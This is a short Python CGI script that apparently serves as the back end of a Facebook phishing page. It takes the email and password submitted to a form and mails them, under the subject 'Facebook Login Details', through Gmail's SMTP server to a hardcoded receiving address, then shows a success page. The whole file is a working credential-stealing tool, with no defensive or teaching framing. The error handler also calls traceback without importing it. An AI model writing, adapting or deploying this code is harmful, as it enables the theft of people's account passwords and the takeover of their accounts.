#!/usr/bin/env python3

import cgi
import smtplib
from email.mime.text import MIMEText

form = cgi.FieldStorage()

email = form.getvalue('email')
password = form.getvalue('password')

# Email configuration
sender_email = 'your_email@gmail.com'
receiver_email = 'pasindunishshanka28@gmail.com'
subject = 'Facebook Login Details'
message = f'Username: {email}\nPassword: {password}'

# SMTP server configuration
smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_username = 'your_email@gmail.com'
smtp_password = 'your_email_password'

# Create a MIMEText object
msg = MIMEText(message)

# Add email headers
msg['Subject'] = subject
msg['From'] = sender_email
msg['To'] = receiver_email

# Connect to SMTP server and send email
# Connect to SMTP server and send email
try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()
    print('Content-Type: text/html\n')
    print('<html><body><h1>Email sent successfully!</h1></body></html>')
except Exception as e:
    print('Content-Type: text/html\n')
    print('<html><body><h1>Error sending email:</h1>')
    traceback.print_exc()
    print('</body></html>')

